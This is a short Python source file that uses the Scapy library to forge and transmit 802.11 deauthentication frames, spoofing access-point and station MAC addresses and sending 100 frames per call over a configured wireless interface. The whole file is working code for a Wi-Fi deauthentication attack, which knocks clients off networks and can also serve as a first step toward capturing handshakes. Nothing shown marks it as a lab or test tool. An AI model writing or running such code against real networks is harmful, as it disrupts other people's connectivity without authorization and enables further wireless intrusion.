from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

import config


def generate_deauth(ap_mac, sta_mac, reason_code):
    match reason_code:
        case 1:
            _send_deauth(source_mac=sta_mac, dest_mac=ap_mac, bssid=ap_mac, reason_code=1)
        case 4:
            _send_deauth(source_mac=ap_mac, dest_mac=sta_mac, bssid=ap_mac, reason_code=4)
        case 5:
            _send_deauth(source_mac=ap_mac, dest_mac=sta_mac, bssid=ap_mac, reason_code=5)
        case 8:
            _send_deauth(source_mac=sta_mac, dest_mac=ap_mac, bssid=ap_mac, reason_code=8)
        case _:
            print("unknown reason code")


def _send_deauth(dest_mac, source_mac, bssid, reason_code):
    packet_to_send = RadioTap() / Dot11(addr1=dest_mac, addr2=source_mac, addr3=bssid) / Dot11Deauth(reason=reason_code)
    sendp(packet_to_send, iface=config.WIFI_INTERFACE_NAME, count=100)
